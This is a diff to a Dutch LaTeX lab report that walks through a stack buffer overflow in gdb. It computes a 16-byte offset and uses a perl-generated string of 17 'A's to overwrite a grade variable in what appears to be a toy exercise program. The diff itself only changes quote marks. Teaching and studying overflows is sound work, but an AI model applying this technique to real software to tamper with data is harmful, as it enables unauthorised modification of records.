@@ -24,7 +24,7 @@
   	\begin{enumerate}
   	\item Controleren of overflow gelukt is
   	\end{enumerate}
-  \item (gdb) run "Billy Eliot"
+  \item (gdb) run ``Billy Eliot''
   \item (gdb) x/x naam
   	\begin{enumerate}
   	\item adres: 0xbffff65a
@@ -38,7 +38,7 @@
   	\item Berekenen hoeveel bytes er geschreven moeten worden om de variabele punt te overschrijven
   	\item \$1 = 16
   	\end{enumerate}
-  \item (gdb) run \$(perl -e 'print "A"x17')
+  \item (gdb) run \$(perl -e `print ``A''x17')
   	\begin{enumerate}
   	\item 17 keer A afprinten
   	\item De variabele punt zal nu overschreven worden met A
@@ -46,12 +46,12 @@
   \item (gdb) cont
   \item (gdb) x/s punt
   	\begin{enumerate}
-  	\item 0xbffff66a: "5/20"
+  	\item 0xbffff66a: ``5/20''
   	\end{enumerate}
   \item (gdb) cont
   \item (gdb) x/s punt
   	\begin{enumerate}
-  	\item 0xbffff66a: "A"
+  	\item 0xbffff66a: ``A''
   	\end{enumerate}
   \item Gelukt!
   \item Volgens de opgave moet Billy Eliot \textgreater 10/20 behalen
